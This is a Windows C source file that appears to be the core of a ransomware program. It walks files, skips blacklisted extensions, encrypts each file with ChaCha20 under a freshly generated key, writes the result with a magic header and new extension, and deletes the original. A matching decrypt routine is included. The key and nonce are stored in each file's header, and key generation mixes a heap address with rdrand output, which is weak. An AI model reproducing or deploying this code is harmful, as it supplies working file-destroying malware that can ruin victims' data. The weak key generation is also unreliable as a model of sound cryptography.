#include <windows.h>
#include <stdio.h>
#include <immintrin.h>
#include "memutils.h"
#include "stringshims.h"
#include "chacha20.h"
#include "crypto.h"

LPCWSTR g_BlacklistedExts[] = { BLACKLISTED_EXTS };

LPCWSTR GetFileExtensionW(LPCWSTR wFilePath) {
    LPCWSTR dot = shim_wcsrchr(wFilePath, L'.');
    return (dot && *dot) ? dot : NULL;
}

BOOL IsBlacklistedExtension(LPCWSTR wFilePath) {
    LPCWSTR ext = GetFileExtensionW(wFilePath);
    for (int i = 0; i < ARRAYSIZE(g_BlacklistedExts); i++)
        if (shim_wcsicmp(ext, g_BlacklistedExts[i]) == 0)
            return TRUE;
    return FALSE;
}

PBYTE GenerateRandomBytes(IN DWORD dwKeySize) {
    PBYTE			pKey = NULL;
    USHORT	        usBytes;
    UINT        	uiSeed = (unsigned int)__TIME__[7];
    BOOL			bResult = FALSE;

    if (!(pKey = _HeapAlloc(dwKeySize)))
        return NULL;

    usBytes = (USHORT)((ULONG_PTR)pKey & 0xFFFF);

    for (int i = 0; i < (int)dwKeySize; i++) {
        if (!_rdrand32_step(&uiSeed)) 
            goto CLEANUP;

        if (i % 2 == 0) 
            pKey[i] = (unsigned int)(((usBytes ^ uiSeed) & 0xFF) % 0xFF);     
        else 
            pKey[i] = (unsigned int)((((usBytes ^ uiSeed) >> 8) & 0xFF) % 0xFF);     
    }

    bResult = TRUE;

CLEANUP:
    if (!bResult && pKey) { HEAP_FREE(pKey); return NULL; }
    return pKey;
}

VOID EncryptSingleFile(LPCWSTR wPath) {
    HANDLE hFile = INVALID_HANDLE_VALUE;
    LARGE_INTEGER FileSize64bit = { 0 };
    DWORD dwFileSize = 0, dwBytesRead = 0, written = 0;
    PBYTE pBuffer = NULL;
    PBYTE pRandomKey = NULL;
    PBYTE pNonce = NULL;
    WCHAR wOutPath[MAX_PATH];
    CHACHA20_CTX ctx;

    if ((hFile = CreateFileW(wPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE)
        goto CLEANUP;

    if (!GetFileSizeEx(hFile, &FileSize64bit) || FileSize64bit.QuadPart == 0 || FileSize64bit.QuadPart > MAXDWORD)
        goto CLEANUP;

    dwFileSize = (DWORD)FileSize64bit.QuadPart;

    if (!(pBuffer = (BYTE*)_HeapAlloc(sizeof(ENCRYPTED_FILE_HEADER) + dwFileSize)))
        goto CLEANUP;

    if (!ReadFile(hFile, pBuffer + sizeof(ENCRYPTED_FILE_HEADER), dwFileSize, &dwBytesRead, NULL) || dwBytesRead != dwFileSize)
        goto CLEANUP;

    if (!(pRandomKey = GenerateRandomBytes(KEY_SIZE)))
        goto CLEANUP;

    if (!(pNonce = GenerateRandomBytes(NONCE_SIZE)))
        goto CLEANUP;

    ChaCha20_Ctx_Init(&ctx, pRandomKey, pNonce, 0);
    ChaCha20_Xor(&ctx, pBuffer + sizeof(ENCRYPTED_FILE_HEADER), dwFileSize);

    ((ENCRYPTED_FILE_HEADER*)pBuffer)->Signature = ENCRYPT_MAGIC;
    _memcpy(((ENCRYPTED_FILE_HEADER*)pBuffer)->Key, pRandomKey, KEY_SIZE);
    _memcpy(((ENCRYPTED_FILE_HEADER*)pBuffer)->Nonce, pNonce, NONCE_SIZE);
    shim_wcscpy_s(wOutPath, _countof(wOutPath), wPath);
    shim_wcscat(wOutPath, _countof(wOutPath), ENCRYPT_EXT);

    DELETE_HANDLE(hFile);

    if ((hFile = CreateFileW(wOutPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE)
        goto CLEANUP;

    if (!(WriteFile(hFile, pBuffer, sizeof(ENCRYPTED_FILE_HEADER) + dwFileSize, &written, NULL)))
        goto CLEANUP;

    if (!DeleteFileW(wPath))
        goto CLEANUP;

#ifdef CONSOLE_STDOUT
    PRINT(L"  [+] Encrypted: %s -> %s\n", wPath, wOutPath);
#endif

CLEANUP:
    DELETE_HANDLE(hFile);
    HEAP_FREE(pBuffer);
    HEAP_FREE(pRandomKey);
    return;
}


VOID DecryptSingleFile(LPCWSTR wPath) {
    HANDLE hFile = INVALID_HANDLE_VALUE;
    LARGE_INTEGER FileSize64bit = { 0 };
    DWORD dwFileSize = 0, dwBytesRead = 0, dwBytesWritten = 0, dwEncSize;
    PBYTE pBuffer = NULL;
    WCHAR wOutPath[MAX_PATH];
    size_t ExtLen = 0, PathLen = 0;
    PBYTE pEncData = NULL;
    CHACHA20_CTX ctx;

    if ((hFile = CreateFileW(wPath, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
#ifdef CONSOLE_STDOUT
        PRINT(L"  [!] Failed to open file: %s\n", wPath);
#endif
        goto CLEANUP;
    }

    if (!GetFileSizeEx(hFile, &FileSize64bit))
        goto CLEANUP;

    dwFileSize = (DWORD)FileSize64bit.QuadPart;

    if (dwFileSize <= sizeof(ENCRYPTED_FILE_HEADER))
        goto CLEANUP;

    if (!(pBuffer = (BYTE*)_HeapAlloc(dwFileSize)))
        goto CLEANUP;

    if (!ReadFile(hFile, pBuffer, dwFileSize, &dwBytesRead, NULL) || dwBytesRead != dwFileSize) {
#ifdef CONSOLE_STDOUT
        PRINT(L"  [!] Failed to read header from file: %s\n", wPath);
#endif
        goto CLEANUP;
    }

    if (((ENCRYPTED_FILE_HEADER*)pBuffer)->Signature != ENCRYPT_MAGIC) {
#ifdef CONSOLE_STDOUT
        PRINT(L"  [!] Invalid signature, skipping file: %s\n", wPath);
#endif
        goto CLEANUP;
    }

    pEncData = pBuffer + sizeof(ENCRYPTED_FILE_HEADER);
    dwEncSize = dwFileSize - sizeof(ENCRYPTED_FILE_HEADER);

    ChaCha20_Ctx_Init(&ctx, ((ENCRYPTED_FILE_HEADER*)pBuffer)->Key, ((ENCRYPTED_FILE_HEADER*)pBuffer)->Nonce, 0);
    ChaCha20_Xor(&ctx, pEncData, dwEncSize);

    ExtLen = shim_wcslen(ENCRYPT_EXT);
    PathLen = shim_wcslen(wPath);

    if (PathLen <= ExtLen || shim_wcsicmp(wPath + PathLen - ExtLen, ENCRYPT_EXT) != 0)
        goto CLEANUP;

    shim_wcsncpy_s(wOutPath, MAX_PATH, wPath, PathLen - ExtLen);
    wOutPath[PathLen - ExtLen] = L'\0';

    DELETE_HANDLE(hFile);

    if ((hFile = CreateFileW(wOutPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
#ifdef CONSOLE_STDOUT
        PRINT(L"  [!] Failed to open file for writing: %s\n", wOutPath);
#endif
        goto CLEANUP;
    }

    if (!WriteFile(hFile, pEncData, dwEncSize, &dwBytesWritten, NULL))
        goto CLEANUP;

    DELETE_HANDLE(hFile);

    if (!DeleteFileW(wPath))
        goto CLEANUP;

#ifdef CONSOLE_STDOUT
    PRINT(L"  [+] Decrypted: %s -> %s\n", wPath, wOutPath);
#endif

CLEANUP:
    DELETE_HANDLE(hFile);
    HEAP_FREE(pBuffer);
    return;
}